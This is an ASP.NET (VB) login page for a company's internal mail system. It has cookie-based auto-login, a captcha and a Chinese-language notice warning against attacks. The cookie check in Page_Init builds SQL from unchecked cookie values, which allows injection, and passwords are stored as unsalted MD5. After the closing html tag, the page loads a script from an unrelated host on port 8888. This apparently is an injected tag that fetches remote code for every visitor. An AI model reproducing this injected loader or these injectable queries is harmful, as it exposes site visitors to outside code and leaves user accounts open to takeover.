<%@ Page Language="VB" ValidateRequest=false%>

<%@ Register Assembly="System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    Namespace="System.Web.UI" TagPrefix="asp" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    Dim dbconn As New dbconn
    Dim conn As Data.OleDb.OleDbConnection
    Dim cmd As Data.OleDb.OleDbCommand
    Dim FunctionClass As New FunctionClass
    Dim dr As Data.OleDb.OleDbDataReader
    Dim VNum As String
    Protected Sub Page_Init(ByVal sender As Object, ByVal e As System.EventArgs)
        On Error Resume Next
        dbconn.Create()
        conn = dbconn.GetConn()
        cmd = conn.CreateCommand
        Dim username As String
        Dim rndtext As String
        If Request.Cookies("nbmailsystem") Is Nothing Then
            Exit Sub
        End If
        If Request.Cookies("nbmailsystem")("username") Is Nothing Or Request.Cookies("nbmailsystem")("rndtext") Is Nothing Then
            Exit Sub
        End If
        username = Trim(Request.Cookies("nbmailsystem")("username").ToString())
        rndtext = Trim(Request.Cookies("nbmailsystem")("rndtext").ToString())
        cmd.CommandText = "select count(*) as count001 from [userinfo] where [username]='" & username & "' and [rndtext]='" & rndtext & "'"
        dr = cmd.ExecuteReader()
        dr.Read()
        If dr("count001") > 0 Then
            dr.Close()
            Response.Redirect("main.aspx")
        End If
        dr.Close()
    End Sub
    Protected Sub Page_Unload(ByVal sender As Object, ByVal e As System.EventArgs)
        On Error Resume Next
        If (conn Is Nothing) = False Then
            dbconn.Close()
            conn = Nothing
            dbconn = Nothing
            cmd = Nothing
        End If
    End Sub
    Protected Sub Timer_timemsg_Tick(ByVal sender As Object, ByVal e As System.EventArgs)
        On Error Resume Next
        Dim tempmsg As String
        Select Case Now.Hour
            Case 0 To 4
                tempmsg = "凌晨好！"
            Case 5 To 7
                tempmsg = "早上好！"
            Case 8 To 11
                tempmsg = "上午好！"
            Case 12
                tempmsg = "中午好！"
            Case 13 To 17
                tempmsg = "下午好！"
            Case 18 To 23
                tempmsg = "晚上好！"
        End Select
        Label_timemsg.Text = "现在是" + CStr(Now.Date.Year) + "年" + Right("0" + CStr(Now.Month), 2) + "月" + Right("0" + CStr(Now.Day), 2) + "日" + " " + Right("0" + CStr(Now.Hour), 2) + "时" + Right("0" + CStr(Now.Minute), 2) + "分" + Right("0" + CStr(Now.Second), 2) + "秒 " + tempmsg
    End Sub
    Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs)
        On Error Resume Next
        If Request.Cookies("nbmailsystem")("username") Is Nothing Then
            GoTo load1
        End If
        If Request.Cookies("nbmailsystem")("rndtext") Is Nothing Then
            GoTo load1
        End If
        If Request.Cookies("nbmailsystem")("username").ToString() <> "" And Request.Cookies("nbmailsystem")("rndtext").ToString() <> "" Then
            If FunctionClass.IsTrue(Request.Cookies("nbmailsystem")("username").ToString()) = False Or FunctionClass.IsTrue(Request.Cookies("nbmailsystem")("rndtext").ToString()) = False Then
                FunctionClass.DisplayErr(weberr.sqlerr)
            Else
                cmd.CommandText = "select * from userinfo where username='" + Request.Cookies("nbmailsystem")("username").ToString() + "'"
                dr = cmd.ExecuteReader()
                If dr.HasRows = True Then
                    dr.Read()
                    If dr("rndtext") = Request.Cookies("nbmailsystem")("rndtext").ToString() Then
                        Response.Redirect("main.aspx")
                    End If
                End If
            End If
        End If
load1:
        ImageButton_verifychar.ImageUrl = "VerifyChar.aspx"
        VNum = Session(FunctionClass.GetIP() + "VNum")
    End Sub
    Protected Sub ImageButton_verifychar_Click(ByVal sender As Object, ByVal e As System.Web.UI.ImageClickEventArgs)
        ImageButton_verifychar.ImageUrl = "VerifyChar.aspx"
        VNum = Session(FunctionClass.GetIP() + "VNum")
    End Sub
    Protected Sub Button_login_Click(ByVal sender As Object, ByVal e As System.EventArgs)
        On Error Resume Next
        Dim cookie As New HttpCookie("nbmailsystem")
        Dim cok As HttpCookie = Request.Cookies("nbmailsystem")
        If Trim(Text_verifychar.Text) = "" Then
            MsgBox("验证码为空！", 4096, "错误")
            Exit Sub
        End If
        If LCase(VNum) <> LCase(Trim(Text_verifychar.Text)) Then
            MsgBox("验证码错误！", 4096, "错误")
        Else
            Dim dr As Data.OleDb.OleDbDataReader
            Text_username.Text = LCase(Trim(Text_username.Text))
            Text_password.Text = Trim(Text_password.Text)
            If Text_username.Text = "" Or Text_password.Text = "" Then
                MsgBox("用户名或密码为空！", 4096, "错误")
            ElseIf FunctionClass.IsTrue(Text_username.Text) = False Then
                FunctionClass.DisplayErr(weberr.sqlerr)
            Else
                cmd.CommandText = "select count(*) as count001 from userinfo where username='" + LCase(Text_username.Text) + "' and password='" + FunctionClass.MD5String(Text_password.Text) + "'"
                dr = cmd.ExecuteReader()
                dr.Read()
                If dr("count001") <= 0 Then
                    MsgBox("用户名或密码错误！", 4096, "错误")
                    dr.Close()
                Else
                    dr.Close()
                    cmd.CommandText = "select * from userinfo where username='" + LCase(Text_username.Text) + "' and password='" + FunctionClass.MD5String(Text_password.Text) + "'"
                    dr = cmd.ExecuteReader()
                    dr.Read()
                    Dim ts = New TimeSpan(-1, 0, 0, 0)
                    cok.Expires = DateTime.Now.Add(ts)
                    cookie.HttpOnly = True
                    cookie.Values.Add("username", Text_username.Text)
                    cookie.Values.Add("rndtext", dr("rndtext"))
                    If Check_autologin.Checked = True Then
                        cookie.Expires = DateTime.MaxValue
                    End If
                    Response.AppendCookie(cookie)
                    Response.Redirect("main.aspx")
                End If
                dr.Close()
            End If
        End If
    End Sub
    Protected Sub Button_register_Click(ByVal sender As Object, ByVal e As System.EventArgs)
        Response.Redirect("register.aspx")
    End Sub
    Protected Sub Button_forgetusername_Click(ByVal sender As Object, ByVal e As System.EventArgs)
        Response.Redirect("forgotusername.aspx")
    End Sub
    Protected Sub Button_forgetpassword_Click(ByVal sender As Object, ByVal e As System.EventArgs)
        Response.Redirect("forgotpassword.aspx")
    End Sub
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
<link rel="stylesheet" href="Style.css" type="text/css" />
<link rel="shortcut icon" href="logo.ico" type="image/x-icon" /> 
    <title>
    <% 
        On Error Resume Next
        Dim cmd1 As Data.OleDb.OleDbCommand
        Dim dr1 As Data.OleDb.OleDbDataReader
        cmd1 = conn.CreateCommand()
        cmd1.CommandText = "select * from WebInfo"
        dr1 = cmd1.ExecuteReader()
        If dr1.HasRows() = True Then
            dr1.Read()
            Response.Write(dr1("comname") & "内部邮件系统")
        End If
        dr1.Close()
     %>
    </title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:scriptmanager ID="Scriptmanager1" runat="server">
        </asp:scriptmanager>
        <asp:UpdatePanel ID="UpdatePanel1" runat="server" UpdateMode="Conditional">
        <ContentTemplate> 
        <asp:Timer ID="Timer_timemsg" runat="server" Interval ="1" OnTick="Timer_timemsg_Tick" /> 
        <asp:Label ID="Label_timemsg" runat="server" Text="Label" Width="744px" />
        </ContentTemplate>
        </asp:UpdatePanel>
        <% 
            On Error Resume Next
            Dim cmd1 As Data.OleDb.OleDbCommand
            Dim dr1 As Data.OleDb.OleDbDataReader
            cmd1 = conn.CreateCommand()
            cmd1.CommandText = "select * from WebInfo"
            dr1 = cmd1.ExecuteReader()
            If dr1.HasRows() = True Then
                dr1.Read()
                Response.Write("<br /><br /><center><img src=logo.jpg><font color=#FFFFFF size=12px>" + dr1("comname") + "内部邮件系统欢迎您！</font></center><br /><br />")
            End If
            dr1.Close()
        %>
        <table width="auto">
        <tr valign ="top">
        <td style="width: 500px; height: 311px" >
        <center>
        <font color="#FFFFFF" size="12px">
        友情提示
        </font>
        </center>
        <font size="5px">
            &nbsp;&nbsp;&nbsp;&nbsp;本系统为公司内部邮件系统，请不要对本系统实施密码爆破行为、DDOS攻击行为、入侵行为、盗号行为、伪造COOKIE、SQL注入行为等一系列行为，除DDOS攻击外，其它行为将被记录到数据库中供系统管理员查看。
            <br />
            *如果发现本系统漏洞，可以提交给系统管理员说明。<br />
            <br />
            <br />
        </font>
        <center>
        <font size="3px">本系统使用权归使用公司所有
            <br />
            by 李志锐 2012
        </font>
        </center>
        </td>
        <td style ="width:20px; height:311px"></td>
        <td style="width: auto; height: 311px">
            <center>
            <font size="12px" color="#ffffff">
            登录
            </font>
            <br/>
            <asp:Label ID="Label1" runat="server" Text="用户名："></asp:Label>
            <asp:TextBox ID="Text_username" runat="server" Height="12px" Width="200px" BackColor="White" BorderColor="White" ForeColor="Black"></asp:TextBox>
            <br/>
            <br/>
            &nbsp;&nbsp;&nbsp;&nbsp;<asp:Label ID="Label2" runat="server" Text="密码："></asp:Label>
            <asp:TextBox ID="Text_password" runat="server" Height="12px" TextMode="Password" Width="200px" Wrap="False" BackColor="White" BorderColor="White" ForeColor="Black"></asp:TextBox>
            <br/>
            <br/>
             <asp:Label ID="Label3" runat="server" Text="验证码："></asp:Label>
                <asp:TextBox ID="Text_verifychar" runat="server" Height="12px" Width="155px"  BackColor="White" ForeColor="Black"></asp:TextBox>
                <asp:ImageButton ID="ImageButton_verifychar" runat="server" Height="20px" Width="41px" OnClick="ImageButton_verifychar_Click" />
                <br/>
                <br/>
                <asp:CheckBox ID="Check_autologin" runat="server" Text="自动登录" />&nbsp;<br/>
                <br/>
             <asp:Button ID="Button_login" runat="server" Text="登录" OnClick="Button_login_Click"  />&nbsp;
            <asp:Button ID="Button_register" runat="server" Text="注册" OnClick="Button_register_Click" />
            </center>
            <center>
                &nbsp;</center>
            <center>
                <asp:Button ID="Button_forgetusername" runat="server" Text="忘记用户名" OnClick="Button_forgetusername_Click" />
                <asp:Button ID="Button_forgetpassword" runat="server" Text="忘记密码" OnClick="Button_forgetpassword_Click" /></center>
        </td>
        </tr>
        </table>
    </div>   
    </form>
</body>
</html>
<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>